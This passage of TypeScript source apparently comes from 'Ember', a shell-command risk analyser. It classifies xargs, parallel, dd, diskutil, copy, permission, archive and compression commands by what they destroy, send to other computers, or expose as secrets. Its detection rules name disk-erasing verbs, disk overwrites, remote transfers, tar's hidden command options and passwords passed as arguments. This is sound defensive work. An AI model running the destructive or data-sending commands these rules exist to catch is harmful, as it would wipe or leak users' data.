  const shell = POSIX_SHELLS[(ops[0].v ?? "").split("/").pop() ?? ""];
  let intoCode = false;
  const words = ops.map((w, k) => {
    if (!repl || w.v === null || !w.v.includes(repl)) return w;
    if (shell && k > 0 && /^-[a-zA-Z]*c$/.test(ops[k - 1].v ?? "")) { intoCode = true; return { ...w, v: w.v.split(repl).join("\"$XARGS_INPUT\"") }; }
    const a: Arg = { v: null, raw: w.raw, glob: false };
    if (fed) a.parts = w.v.split(repl).flatMap((piece, j) => (j === 0 ? [piece] : [...fed, piece]));
    return a;
  });
  return { words: repl ? words : [...words, { v: null, raw: "(input)", glob: false, ...(fed ? { parts: fed } : {}) }], intoCode };
}

/** The input Ember sees with no batches told apart: with a placeholder one command per line, otherwise one with every word. */
function xargsWhole(seen: string, repl: string | undefined, ops: readonly Arg[]): Arg[][] | null {
  if (repl) {
    const lines = seen.split("\n").map(l => l.trim()).filter(l => l !== "").slice(0, MAX_FORMS);
    return lines.length ? lines.map(l => ops.map(w => (w.v !== null && w.v.includes(repl) ? lit(w.v.split(repl).join(l)) : w))) : null;
  }
  const all = seen.split(/\s+/).filter(w => w !== "").map(w => lit(w));
  return all.length ? [[...ops, ...all]] : null;
}

/**
 * The commands xargs builds from input Ember sees whole: with -I one per line, the line where the placeholder is;
 * with -n or -L one per batch of words or lines; otherwise one, the words after the command's own. null when Ember
 * can't tell the batches (a size limit, an end-of-input word, a count that is no number, a line that continues, more
 * batches than it judges, or no input at all), which is then judged as input it can't see.
 */
function xargsBuilds(p: Parsed, seen: string, repl: string | undefined, ops: readonly Arg[]): Arg[][] | null {
  if (has(p, "s", "max-chars", "x", "exit", "E", "e", "eof")) return null;
  const lines = seen.split("\n").filter(l => l.trim() !== "");
  if (repl) {
    const each = lines.map(l => l.trim());
    return each.length && each.length <= MAX_FORMS ? each.map(l => ops.map(w => (w.v !== null && w.v.includes(repl) ? lit(w.v.split(repl).join(l)) : w))) : null;
  }
  const count = (vs: (string | null)[], bare: boolean): number | null | undefined => {
    if (vs.length === 0) return bare ? 1 : undefined;
    const v = vs[vs.length - 1];
    return v !== null && /^[1-9]\d{0,5}$/.test(v) ? Number(v) : null;
  };
  const perWords = count(values(p, "n", "max-args"), false);
  const perLines = count(values(p, "L", "l", "max-lines"), has(p, "l", "max-lines"));
  if (perWords === null || perLines === null || (perWords !== undefined && perLines !== undefined)) return null;
  const wordsOf = (t: string): Arg[] => t.split(/\s+/).filter(w => w !== "").map(w => lit(w));
  let batches: Arg[][];
  if (perLines !== undefined) {
    // A line that ends in a blank continues on the next one.
    if (lines.some(l => /[ \t]$/.test(l))) return null;
    batches = [];
    for (let k = 0; k < lines.length; k += perLines) batches.push(wordsOf(lines.slice(k, k + perLines).join(" ")));
  } else {
    const all = wordsOf(seen);
    batches = [];
    for (let k = 0; k < all.length; k += perWords ?? all.length) batches.push(all.slice(k, k + (perWords ?? all.length)));
  }
  return batches.length && batches.length <= MAX_FORMS ? batches.map(b => [...ops, ...b]) : null;
}

reg(NATIVE, ["parallel"], h => {
  if (h.args.some(a => a.v !== null && /^:::+\+?$/.test(a.v))) { h.e.unclear("unclear.parallel", "Ember can't tell what parallel runs."); return; }
  // -X (context replace) is a switch, and -l, -i and -e take a value only attached (commands-remote-c4-1).
  const spec: OptSpec = {
    shortValue: "jSaEdINnLCs", shortOptional: "lie", stopAtOperand: true, jobCounts: ["j", "jobs"],
    longValue: [
      "jobs", "sshlogin", "sshloginfile", "slf", "arg-file", "delimiter", "joblog", "results", "tmpdir", "max-args", "colsep", "timeout", "delay", "workdir", "wd",
      "basefile", "bf", "return", "transferfile", "tf", "tagstring", "tag-string", "header", "halt", "nice", "retries", "memfree", "load", "env", "termseq",
      "limit", "arg-sep", "arg-file-sep", "block", "blocksize", "recstart", "recend", "semaphorename", "id", "ssh", "sshdelay", "rpl", "process-slot-var", "max-chars",
    ],
  };
  // Main's table knew eight value options and took -X for one, so the word after any other (`--timeout 5`, `--wd dir`,
  // `-n 1`) was the program it ran: judged that way too; a job count is the one thing read as now (commands-held-4).
  const was: OptSpec = { shortValue: "jSaEdIX", longValue: ["jobs", "sshlogin", "arg-file", "eof", "delimiter", "joblog", "results", "tmpdir"], stopAtOperand: true, jobCounts: ["j", "jobs"] };
  const p = heldOpts(h, spec, was);
  if (p.operands.length === 1 && (p.operands[0].v ?? " ").includes(" ")) { h.e.unclear("unclear.parallel", "Ember can't tell what parallel runs."); return; }
  if (has(p, "S", "sshlogin")) h.e.add("publish", "send.ssh", "Sends data to another computer.");
  // --wd: the folder each command runs in, judged as a cd to it is (commands-remote-v5-3); `...` is a new one.
  const wd = values(p, "wd", "workdir").filter(d => d !== "...").pop();
  optionFiles(h, h.args, p, { cd: ["wd", "workdir"] });
  const sc = wd === undefined ? h.sc : child(h.sc, { cwd: wd === null || !h.sc.cwd ? null : resolveTargetPath(wd, { os: h.sc.os, home: h.sc.home ?? "", cwd: h.sc.cwd }) }, more(h.sc));
  // A here-string's variables stand for the input, as with xargs (commands-remote-w5-5).
  const fed = values(p, "a", "arg-file").length ? undefined : h.s.stdinVars?.word?.parts;
  h.e.payload([...p.operands, { v: null, raw: "(input)", glob: false, ...(fed ? { parts: fed } : {}) }], sc, "parallel");
});

reg(NATIVE, ["truncate"], h => {
  const p = opts(h, { shortValue: "sr", longValue: ["size", "reference"] });
  for (const r of values(p, "r", "reference")) if (r) h.e.usePath(lit(r), "read", h.sc);
  const objs = objsOf(h, p.operands, "write");
  h.e.add("destroy", "posix.truncate", `Empties ${listOf(objs)}.`, { objects: objs });
});

reg(NATIVE, ["dd"], h => {
  // A copy of a download is the download under its new name (commands-remote-c2-2).
  const from = h.args.map(a => /^if=(.*)$/.exec(a.v ?? "")?.[1]).find(v => v !== undefined);
  const copiesDownload = from !== undefined && h.e.isDownloaded(lit(from), h.sc);
  for (const a of h.args) {
    const v = a.v;
    if (v === null) { h.e.unclear("unclear.unresolved-arg", "Ember can't tell which arguments dd gets."); continue; }
    const m = /^(if|of)=(.*)$/.exec(v);
    if (!m) continue;
    if (m[1] === "if") { h.e.usePath({ ...a, v: m[2] }, "read", h.sc); continue; }
    if (NULL_SINKS.has(m[2].toLowerCase())) continue;
    const obj = h.e.usePath({ ...a, v: m[2] }, "write", h.sc);
    if (copiesDownload && obj.abs) h.e.carryDownload(obj.abs, h.sc);
    const disk = obj.abs !== null && writeKind(obj.abs, h.sc.path) === "disk";
    h.e.add("destroy", "posix.dd", disk ? `Overwrites the disk ${obj.text}.` : `Overwrites ${obj.text}.`, { objects: [obj] });
  }
});

reg(NATIVE, ["diskutil"], h => {
  const verb = lower(h.args[0]) ?? "";
  if (/^(erasedisk|erasevolume|partitiondisk|zerodisk|securerase|secureerase|reformat|randomdisk|erase)$/.test(verb)) h.e.add("destroy", "disk.erase", "Erases or repartitions a disk.");
  else if (/^(mount|unmount|umount|mountdisk|unmountdisk|eject|apfs|cs|ar|enablejournal|disablejournal|rename|repair)/.test(verb)) h.e.add("system", "system.kernel", "Changes how the system works.");
});

// cp, mv, install, ln, rsync (local): the destination may exist (§3.5.1).
function copyLike(h: H, kind: "cp" | "mv" | "install" | "ln"): void {
  // Main's table gave them all the next word, so other words were the files copied: judged that way too (commands-held-8).
  const p = heldOpts(h, {
    // install's -b (backup) takes no value; --backup, --context, --reflink, --preserve and --update take one only after =
    // (commands-remote-c4-3).
    shortValue: kind === "install" ? "mgotS" : "tS",
    longValue: ["target-directory", "suffix", "mode", "group", "owner", "strip-program", "sparse", "no-preserve"],
    longOptional: ["backup", "context", "reflink", "preserve", "update"],
  }, { shortValue: kind === "install" ? "mgotSb" : "tS", longValue: ["target-directory", "suffix", "mode", "group", "owner", "strip-program", "context", "backup", "reflink", "sparse", "preserve", "no-preserve", "update"] });
  if (kind === "install" && has(p, "d", "directory")) { objsOf(h, p.operands, "write"); return; }
  const noClobber = has(p, "n", "no-clobber") || values(p, "update").includes("none");
  const rec = has(p, "r", "R", "recursive", "a", "archive");
  const target = values(p, "t", "target-directory")[0];
  const srcUse: PathUse = kind === "mv" ? "move" : kind === "ln" ? "read" : rec ? "readTree" : "read";
  let sources = p.operands;
  let dest: Arg | undefined;
  if (target !== undefined) dest = target === null ? { v: null, raw: "?", glob: false } : lit(target);
  else if (sources.length >= 2) { dest = sources[sources.length - 1]; sources = sources.slice(0, -1); }
  else if (kind === "ln" && sources.length === 1) { dest = lit("."); }
  objsOf(h, sources, srcUse);
  if (!dest) {
    // With no destination it can't run as it is; it is asked about rather than judged as nothing (commands-remote-i5a).
    if (!has(p, "help", "version") && !h.e.readsAsMain) h.e.add("destroy", `posix.${kind}`, "Writes to a file Ember can't name.");
    return;
  }
  const destObj = h.e.usePath(dest, "write", h.sc);
  // `.` and `..` are always folders: `cp x .` puts x in the current folder (commands-remote-v1).
  const intoFolder = target !== undefined || sources.length > 1 || /[\\/]$/.test(dest.v ?? "") || /^\.\.?$/.test(dest.v ?? "");
  // Copies that don't land at folder/<name>: `cp --parents src/a.txt dir` makes dir/src/a.txt, and a Mac's own cp
  // (BSD) copies what is in `build/` into the folder itself rather than the folder (commands-remote-c2-1).
  const parents = kind === "cp" && has(p, "parents");
  const bsdContents = (s: Arg): boolean => h.key === "cp" && h.sc.os === "darwin" && /[\\/]$/.test(s.v ?? "");
  // -T, and ln's -n, take the name as it is.
  const asIs = has(p, "T", "no-target-directory") || (kind === "ln" && has(p, "n", "no-dereference"));
  /** The file a source becomes in the folder (`cp a dir` makes dir/a), probed once; null for files Ember can't name. */
  const insides = new Map<Arg, Obj | null>();
  const inside = (s: Arg): Obj | null => {
    if (insides.has(s)) return insides.get(s) ?? null;
    // A glob, or a folder's contents (`cp -r /tmp/x/. .`): files of their own names.
    const name = s.v === null || s.glob || parents || bsdContents(s) ? null : baseName(s.v.replace(/[\\/]+$/, ""), h.sc.path.flavour);
    let out: Obj | null = null;
    if (name !== null && name !== "." && name !== ".." && destObj.abs !== null) {
      const p2 = (h.sc.path.flavour === "win32" ? win32 : posix).join(destObj.abs, name);
      // Into a folder named with `..` (`cp a sub/../`): the file lands beside where sub leads, so that name (its `..`
      // kept, never joined lexically) is probed and is what "if it exists" asks about.
      const o2 = h.e.usePath(lit(destObj.phys !== undefined ? `${destObj.phys}/${name}` : p2), "write", h.sc);
      out = { kind: "path", text: p2, resolved: p2, abs: p2, ...(o2.phys !== undefined ? { phys: o2.phys } : {}), ...(o2.realDiffers ? { realDiffers: true } : {}) };
    }
    insides.set(s, out);
    return out;
  };
  // A copy, move or link of a download is the download under its new name, so running it asks (commands-remote-c2-2):
  // into a folder, the file of its name there (the whole folder for files Ember can't name); a name that may be a
  // folder counts too until the target says it is one.
  if (destObj.abs !== null) {
    for (const s of sources) {
      if (!h.e.isDownloaded(s, h.sc) && !h.e.mayBeDownload(s, h.sc)) continue;
      const obj = asIs ? null : inside(s);
      if (obj?.abs) h.e.carryDownload(obj.abs, h.sc);
      // A source Ember can't name lands as a file of unknown name there, never the whole folder (commands-remote-r4-3).
      if (asIs) h.e.carryDownload(destObj.abs, h.sc);
      else if (!obj) h.e.carryUnnamed(destObj.abs, intoFolder, h.sc);
      else if (!intoFolder) h.e.carryDownload(destObj.abs, h.sc, true);
    }
  }
  if (kind === "ln" && !has(p, "f", "force")) return;
  if (noClobber) return;
  const rule = `posix.${kind}`;
  if (destObj.abs === null) { h.e.add("destroy", rule, "Writes to a file Ember can't name.", { objects: [destObj] }); return; }
  if (intoFolder) {
    for (const s of sources) {
      const obj = inside(s);
      if (obj === null) {
        h.e.judgeInside(destObj.abs, "write", h.sc, destObj.text);
        h.e.add("destroy", rule, `Replaces files in ${destObj.text} if they exist.`, { objects: [destObj] });
        continue;
      }
      h.e.add("destroy", rule, `Replaces ${obj.abs} if it exists.`, { objects: [obj], ifExists: obj.abs! });
    }
    return;
  }
  // A name without a slash may be a folder there (`mv report.pdf ~/Documents`): then the file goes inside it, and only
  // a file of its name there is replaced (commands-remote-r1).
  const obj = asIs || sources.length !== 1 ? null : inside(sources[0]);
  const inFolder = obj ? { says: `Replaces ${obj.abs} if it exists.`, objects: [obj], ifExists: obj.abs! }
    : asIs || sources.length !== 1 ? undefined : { says: `Replaces files in ${destObj.text} if they exist.`, objects: [destObj], ifExists: destObj.abs };
  h.e.add("destroy", rule, `Replaces ${destObj.text} if it exists.`, { objects: [destObj], ifExists: destObj.abs, ...(inFolder ? { inFolder } : {}) });
}
reg(NATIVE, ["cp", "gcp"], h => copyLike(h, "cp"));
reg(NATIVE, ["mv", "gmv"], h => copyLike(h, "mv"));
reg(NATIVE, ["install", "ginstall"], h => copyLike(h, "install"));
reg(NATIVE, ["ln", "gln"], h => copyLike(h, "ln"));

reg(NATIVE, ["tee"], h => {
  const p = opts(h);
  for (const f of p.operands) {
    if (has(p, "a", "append")) { h.e.append(f, h.sc, "redirect.append"); continue; }
    if (f.v !== null && NULL_SINKS.has(f.v.toLowerCase())) continue;
    const obj = h.e.usePath(f, "write", h.sc);
    if (obj.abs === null) { h.e.add("destroy", "posix.tee", "Writes to a file Ember can't name."); continue; }
    h.e.add("destroy", "posix.tee", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs });
  }
});

reg(NATIVE, ["touch", "mkdir", "mkfifo", "mknod", "mktemp"], h => {
  // --context (and mktemp's --tmpdir) take a value only after = (commands-remote-i5a).
  // Main's table gave --context and --tmpdir the next word, gave mkfifo and mknod's -p and -t one where -m takes it, and
  // knew no --time: judged that way too (commands-held-8).
  const p = heldOpts(h, { shortValue: h.key === "touch" ? "dtr" : h.key === "mktemp" ? "pt" : "m", longValue: ["date", "reference", "time", "mode", "suffix"], longOptional: ["context", "tmpdir"] }, { shortValue: h.key === "touch" ? "dtr" : h.key === "mkdir" ? "m" : "pt", longValue: ["date", "reference", "mode", "tmpdir", "suffix", "context"] });
  if (h.key === "mktemp") return;
  const mark = h.e.written.length;
  objsOf(h, h.key === "mknod" ? p.operands.slice(0, 1) : p.operands, "write");
  // A new empty file or folder, or a time, doesn't change what a script says (a FIFO does: it is a stream).
  if (h.key === "touch" || h.key === "mkdir") h.e.written.length = mark;
});

// Permissions (§3.5.5).
reg(NATIVE, ["chmod", "chown", "chgrp", "setfacl", "chattr", "chflags"], h => {
  const p = opts(h, { shortValue: h.key === "setfacl" ? "mMxX" : "", longValue: ["reference", "from", "modify", "remove", "set", "set-file"] });
  const rec = has(p, "R", "recursive") || (h.key === "chflags" && has(p, "R"));
  let ops = p.operands;
  if (h.key !== "setfacl" && h.key !== "chattr" && !values(p, "reference").length) ops = ops.slice(1);
  if (h.key === "chattr") ops = ops.filter(o => !/^[-+=]/.test(o.v ?? ""));
  const mark = h.e.written.length;
  const objs = objsOf(h, ops, rec ? "permTree" : "write");
  // Permissions don't change what a script says (`chmod +x t.sh && ./t.sh` reads t.sh as it is).
  h.e.written.length = mark;
  const outside = objs.some(o => o.abs === null || !h.sc.home || !isUnder(o.abs, h.sc.home, h.sc.path)) && !objs.every(o => o.abs !== null && inWorkTree(o.abs, h.sc.path));
  if (rec || h.key === "chattr" || (outside && objs.some(o => o.abs !== null && writeKind(o.abs, h.sc.path) === "system")) || (h.key !== "chmod" && outside)) {
    h.e.add("system", "system.permissions", "Changes who may read or change files.", { objects: objs, widening: rec ? ["recursive"] : [] });
  }
});

// Archivers (§3.5.1, critique security-6).
/** GNU tar's short options that take a value (-j, -J and -z are switches: commands-remote-i5a). */
const TAR_VALUE = "fCbKNTXgLVFHI";
/** A Mac's own tar (bsdtar): -H and -L follow links, -I names a file list as -T does, and -s takes a pattern. */
const BSDTAR_VALUE = "fCbTXIs";
/** tar's table as main had it at 4d64d3a, for every tar: the row is judged by it too (heldOpts, commands-held-8). */
const TAR_MAIN: OptSpec = {
  shortValue: "fCbKNTXgLVFHIj",
  longValue: ["file", "directory", "files-from", "exclude-from", "exclude", "use-compress-program", "transform", "xform", "to-command", "info-script", "new-volume-script", "newer", "after-date", "owner", "group", "mode", "mtime", "format", "label", "volno-file", "checkpoint-action", "index-file", "warning", "record-size", "blocking-factor", "tape-length", "sort"],
};
/** tar's option table, for its row and for TAR_OPTIONS, which GNU tar reads as options too (commands-remote-x8-4). */
function tarSpec(bsd: boolean): OptSpec {
  return {
    shortValue: bsd ? BSDTAR_VALUE : TAR_VALUE,
    longValue: ["file", "directory", "files-from", "exclude-from", "exclude", "use-compress-program", "transform", "xform", "to-command", "info-script", "new-volume-script", "newer", "after-date", "owner", "group", "mode", "mtime", "format", "label", "volno-file", "checkpoint-action", "index-file", "warning", "record-size", "blocking-factor", "tape-length", "sort", "strip-components", "exclude-tag", "exclude-tag-all", "exclude-tag-under", "suffix", "owner-map", "group-map", "level", "hole-detection", "pax-option", "quoting-style", "quote-chars", "no-quote-chars", "rmt-command", "rsh-command", "listed-incremental", "starting-file", "options"],
    longOptional: ["backup", "checkpoint", "occurrence", "one-top-level", "totals", "atime-preserve"],
  };
}
/**
 * Whether tar's options name a command it runs: a filter, a compressor, a volume script, a checkpoint's action, a shell.
 * GNU's `-F` is `--info-script` (commands-remote-y8-4).
 */
function tarRunsCommand(p: Parsed, bsd: boolean): boolean {
  return has(p, "to-command", "use-compress-program", "info-script", "new-volume-script", "checkpoint-action", "rsh-command") || (!bsd && has(p, "I", "F")) || values(p, "checkpoint-action").length > 0;
}
reg(NATIVE, ["tar", "bsdtar", "gtar"], h => {
  const a = [...h.args];
  // Old-style bundled first argument (`tar xzf x.tgz`).
  if (a[0]?.v && !a[0].v.startsWith("-")) a[0] = { ...a[0], v: `-${a[0].v}` };
  const bsd = h.key === "bsdtar" || (h.key === "tar" && h.sc.os === "darwin");
  // Main's table gave GNU tar's -j the next word, a Mac's tar GNU's letters, and knew none of --exclude-tag, --level,
  // --options, --strip-components and the like, so the word after one was a member or a file to pack: judged that way too
  // (commands-held-8).
  const p = heldOpts(h, tarSpec(bsd), TAR_MAIN, a);
  const extract = has(p, "x", "extract", "get");
  const create = has(p, "c", "create", "r", "append", "u", "update", "A", "catenate", "concatenate");
  const archive = values(p, "f", "file")[0];
  const dir = values(p, "C", "directory")[0];
  // A word Ember can't see all of is read by its written text too, quotes dropped, so an option whose value is a variable
  // or a substitution (`--to-command="$T"`, `-I"$T"`) asks as the value written out does (commands-remote-y8-4).
  // bsdtar's and a Mac's own -I names a list of files (read below), but it asked for every tar at 4d64d3a, and the `tar`
  // on a Mac may be GNU's, which runs the program -I names: it still asks wherever main's table saw an -I
  // (commands-held-x9-5).
  const mainI = bsd && has(parseOpts(a, TAR_MAIN), "I");
  if (tarRunsCommand(p, bsd) || mainI || a.some(w => w.v === null && tarRunsCommand(parseOpts([lit(w.raw.replace(/["']/g, ""))], tarSpec(bsd)), bsd))) h.e.unclear("unclear.tar-command", "It runs a command Ember can't see.");
  // The lists of names to pack or leave out are files tar reads, and its errors show their lines (review #174).
  for (const f of values(p, "T", "files-from", "X", "exclude-from", ...(bsd ? ["I"] : []))) if (f !== null && !STDIN_NAME.test(f)) h.e.usePath(lit(f), "read", h.sc);
  // An incremental backup's snapshot file, which tar rewrites, and the owner and group maps it reads (commands-remote-v5-3).
  optionFiles(h, a, p, { write: ["g", "listed-incremental"], read: ["owner-map", "group-map"] });
  if (archive) {
    const arc = lit(archive);
    if (URL_LIKE.test(archive) || SCP_LIKE.test(archive)) h.e.add("publish", "send.tar", "Sends data to another computer.");
    else if (archive !== "-" && !NULL_SINKS.has(archive.toLowerCase())) h.e.usePath(arc, create ? "write" : "read", h.sc);
  }
  if (create) {
    const inputs = objsOf(h, p.operands, "readTree");
    if (has(p, "remove-files")) h.e.add("destroy", "archive.remove-files", `Deletes ${listOf(inputs)} after packing them.`, { objects: inputs });
    if (archive && archive !== "-" && !NULL_SINKS.has(archive.toLowerCase()) && !URL_LIKE.test(archive)) {
      const obj = h.e.usePath(lit(archive), "write", h.sc);
      if (obj.abs && has(p, "c", "create")) h.e.add("destroy", "redirect.overwrite", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs });
      // An archive of a download holds it (commands-remote-c2-2).
      if (p.operands.some(o => h.e.isDownloaded(o, h.sc) || h.e.holdsDownload(o, h.sc))) h.e.carryDownload(archive, h.sc);
    }
    return;
  }
  if (extract) {
    const into = dir ? h.e.usePath(lit(dir), "write", h.sc) : h.e.usePath(lit("."), "write", h.sc);
    const risky = has(p, "P", "absolute-names", "overwrite", "unlink-first", "U", "recursive-unlink");
    if (risky || into.abs === null || !inWorkTree(into.abs, h.sc.path)) {
      h.e.add("destroy", "archive.unpack", `Unpacks ${archive ?? "an archive"} over files in ${into.text === "." ? thisFolder(h, into) : into.text}.`, { objects: [into] });
    }
    // From a download, or a pipe that fetched one or packs one (`tar cf - x.sh | tar xf - -C tools`: commands-remote-c2-2).
    if ((archive && h.e.isDownloaded(lit(archive), h.sc)) || (archive === "-" || !archive) && (h.s.fetchBefore || h.e.pipe.carried === true)) if (into.abs) h.e.downloads.push(into.abs);
    objsOf(h, p.operands, "write");
  }
});

reg(NATIVE, ["zip"], h => {
  // -T tests the archive and takes no value; -TT and -tt are one option each, written with one dash (commands-remote-i5a).
  const two: Readonly<Record<string, string>> = { "-TT": "--unzip-command", "-tt": "--tt" };
  // Main's table gave -T the next word and read -TT and -tt as written, so the file or the option after -T's word was
  // read (`zip -T -n <file>`): judged that way too (commands-held-9).
  const p = heldOpts(h, { shortValue: "bnPtZ", longValue: ["temp-path", "suffixes", "password", "unzip-command", "tt"] }, { shortValue: "bnPtTZ", longValue: ["temp-path", "suffixes", "password", "unzip-command", "tt"] }, h.args.map(a => (a.v !== null && two[a.v] ? { ...a, v: two[a.v] } : a)), h.args);
  if (has(p, "unzip-command") || h.args.some(a => /^(-TT|--unzip-command|--tt)/.test(a.v ?? ""))) h.e.unclear("unclear.zip-command", "It runs a command Ember can't see.");
  const [arc, ...inputs] = p.operands;
  if (arc) {
    const obj = h.e.usePath(arc, "write", h.sc);
    void obj;
  }
  const ins = objsOf(h, inputs, has(p, "r", "recurse-paths") ? "readTree" : "read");
  // An archive of a download holds it, so unpacking it marks where it goes (commands-remote-c2-2).
  if (arc?.v && inputs.some(i => h.e.isDownloaded(i, h.sc) || h.e.holdsDownload(i, h.sc))) h.e.carryDownload(arc.v, h.sc);
  if (has(p, "m", "move")) h.e.add("destroy", "archive.remove-files", `Deletes ${listOf(ins)} after packing them.`, { objects: ins });
  if (has(p, "P", "password") || h.args.some(a => /^-P./.test(a.v ?? ""))) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
});

reg(NATIVE, ["7z", "7za", "7zz", "7zr"], h => {
  const verb = lower(h.args[0]) ?? "";
  const rest = h.args.slice(1);
  const sw = rest.filter(a => (a.v ?? "").startsWith("-")).map(a => a.v!.toLowerCase());
  const ops = rest.filter(a => !(a.v ?? "").startsWith("-"));
  if (sw.some(s => s.startsWith("-p") && s.length > 2)) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
  if (verb === "x" || verb === "e") {
    const outDir = sw.find(s => s.startsWith("-o"))?.slice(2);
    if (ops[0]) h.e.usePath(ops[0], "read", h.sc);
    const into = h.e.usePath(lit(outDir || "."), "write", h.sc);
    if (sw.some(s => s === "-aoa" || s === "-y") || into.abs === null || !inWorkTree(into.abs, h.sc.path)) {
      h.e.add("destroy", "archive.unpack", `Unpacks ${ops[0]?.v ?? "an archive"} over files in ${outDir || thisFolder(h, into)}.`, { objects: [into] });
    }
    // What a downloaded archive unpacks is downloaded too, as unzip's is (commands-classes-y9-5).
    if (ops[0] && h.e.isDownloaded(ops[0], h.sc) && into.abs) h.e.downloads.push(into.abs);
    return;
  }
  if (verb === "a" || verb === "u") {
    if (ops[0]) h.e.usePath(ops[0], "write", h.sc);
    const ins = objsOf(h, ops.slice(1), "readTree");
    if (sw.includes("-sdel")) h.e.add("destroy", "archive.remove-files", `Deletes ${listOf(ins)} after packing them.`, { objects: ins });
    return;
  }
  if (verb === "d") { const objs = objsOf(h, ops, "write"); h.e.add("destroy", "archive.delete", `Deletes files inside ${listOf(objs)}.`, { objects: objs }); return; }
  h.e.readArgs(ops, h.sc);
});

reg(NATIVE, ["rar", "unrar"], h => {
  const verb = lower(h.args[0]) ?? "";
  const rest = h.args.slice(1);
  const sw = rest.filter(a => (a.v ?? "").startsWith("-")).map(a => a.v!.toLowerCase());
  const ops = rest.filter(a => !(a.v ?? "").startsWith("-"));
  if (sw.some(s => /^-hp.|^-p./.test(s))) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
  if (verb === "m" || verb === "mf" || sw.includes("-df")) {
    const ins = objsOf(h, ops.slice(1), "readTree");
    h.e.add("destroy", "archive.remove-files", `Deletes ${listOf(ins)} after packing them.`, { objects: ins });
    return;
  }
  if (verb === "x" || verb === "e") {
    const into = h.e.usePath(ops[1] ?? lit("."), "write", h.sc);
    if (sw.some(s => s === "-o+" || s === "-y") || into.abs === null || !inWorkTree(into.abs, h.sc.path)) h.e.add("destroy", "archive.unpack", `Unpacks ${ops[0]?.v ?? "an archive"} over files in ${into.text}.`, { objects: [into] });
    if (ops[0] && h.e.isDownloaded(ops[0], h.sc) && into.abs) h.e.downloads.push(into.abs);
    return;
  }
  h.e.readArgs(ops, h.sc);
});

reg(NATIVE, ["unzip"], h => {
  const p = opts(h, { shortValue: "dxP", longValue: [] });
  if (h.args.some(a => /^-P./.test(a.v ?? "")) || values(p, "P").length) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
  if (has(p, "l", "t", "v", "Z", "z")) { h.e.readArgs(p.operands, h.sc); return; }
  const dir = values(p, "d")[0];
  if (p.operands[0]) h.e.usePath(p.operands[0], "read", h.sc);
  const into = h.e.usePath(lit(dir ?? "."), "write", h.sc);
  if (has(p, "o") || into.abs === null || !inWorkTree(into.abs, h.sc.path)) {
    h.e.add("destroy", "archive.unpack", `Unpacks ${p.operands[0]?.v ?? "an archive"} over files in ${dir ?? thisFolder(h, into)}.`, { objects: [into] });
  }
  if (p.operands[0] && h.e.isDownloaded(p.operands[0], h.sc) && into.abs) h.e.downloads.push(into.abs);
});

reg(NATIVE, ["cpio"], h => {
  // -s swaps bytes and takes no value; -C is the block size (commands-remote-i5a).
  // Main's table gave -s the next word and knew no -C, --io-size, --message or --block-size, so the option after one of
  // those (`cpio -i -C -u`) was read: judged that way too (commands-held-9).
  const p = heldOpts(h, { shortValue: "EFHIMORCD", longValue: ["file", "format", "pattern-file", "rsh-command", "owner", "directory", "io-size", "message", "block-size"] }, { shortValue: "EFHIMORsD", longValue: ["file", "format", "pattern-file", "rsh-command", "owner", "directory"] });
  if (has(p, "rsh-command")) h.e.unclear("unclear.cpio-command", "It runs a command Ember can't see.");
  if (has(p, "i", "extract")) {
    // -D/--directory: the folder it unpacks into (review #169).
    const dir = values(p, "D", "directory")[0];
    const into = dir === null ? { kind: "other" as const, text: "a folder Ember can't name", abs: null } : h.e.usePath(lit(dir ?? "."), "write", h.sc);
    if (has(p, "u", "unconditional") || into.abs === null || !inWorkTree(into.abs, h.sc.path)) h.e.add("destroy", "archive.unpack", `Unpacks an archive over files in ${dir === undefined ? thisFolder(h, into) : into.text}.`, { objects: [into] });
  }
  if (has(p, "p", "pass-through")) {
    const dest = p.operands[0];
    if (dest) h.e.usePath(dest, "write", h.sc);
  }
});

// Compressors replace their input with the packed (or unpacked) file unless told to keep it.
reg(NATIVE, ["gzip", "gunzip", "bzip2", "bunzip2", "xz", "unxz", "lzma", "unlzma", "lzip", "compress", "uncompress", "zstd", "unzstd", "lz4", "pigz", "unpigz", "brotli"], h => {
  // --rsyncable takes no value (commands-remote-i5a); xz's -T, -M, -F and -C, pigz's -p and -b, zstd's and brotli's -o do.
  const valueShort: Readonly<Record<string, string>> = { xz: "STMFC", unxz: "STMFC", lzma: "STMFC", unlzma: "STMFC", pigz: "Spb", unpigz: "Spb", zstd: "oD", unzstd: "oD", brotli: "oqwS" };
  // Main's table gave --rsyncable the next word and knew no --output, --quality, --window, --blocksize or --patch-from, nor
  // the letters for them, so the word after one was a file to pack: judged that way too. A count of threads or processes
  // is the one thing read as now (commands-held-8): -T, -p and --processes took no value there, so in main's reading
  // they take the next word only when it is a count as written, and a switch or `--` after one is read as it was
  // (`xz -T -- file`, `zstd --processes --rm file`: commands-held-10).
  const counts = (valueShort[h.key] ?? "").replace(/[^Tp]/g, "");
  const p = heldOpts(h, { shortValue: valueShort[h.key] ?? "S", longValue: ["suffix", "format", "threads", "memlimit", "output", "quality", "window", "processes", "blocksize", "patch-from"] }, { shortValue: "S", shortNumeric: counts, longValue: ["suffix", "rsyncable", "format", "threads", "memlimit"], longNumeric: ["processes"], numericCountOnly: [...counts, "processes"] });
  const keeps = has(p, "k", "keep", "c", "stdout", "to-stdout", "t", "test", "l", "list", "h", "help", "V", "version");
  const removes = ["zstd", "unzstd", "lz4", "brotli"].includes(h.key) ? has(p, "rm") : !keeps;
  // The word after a count or format option (`xz -T big.tar`, `xz -M 1G`, `pigz -p "$N"`, `xz -T
  // ~/.config/ember/settings.json`) is judged as a file the tool packs as well, as it was before these options took a
  // value: main asked for it whatever it was, a count or a format too, a processor count's substitution included
  // (`xz -T $(nproc)` with nothing else to pack asked on main, as `xz -T 4` did: commands-remote-r7-2, x7-5).
  const stray = p.opts.flatMap(o => {
    const next = h.args[o.at + 1];
    const word = h.args[o.at]?.v ?? "";
    const short = /^-[A-Za-z]$/.test(o.name) && "TMFCpbqw".includes(o.name[1]) && (valueShort[h.key] ?? "").includes(o.name[1]) && word.endsWith(o.name[1]) && !word.startsWith("--");
    const long = /^--(processes|blocksize|quality|window|patch-from)$/.test(o.name) && word === o.name;
    if (o.value === undefined || !next || !(short || long)) return [];
    return [next];
  });
  const packed = [...p.operands, ...stray];
  const ins = objsOf(h, packed, "write");
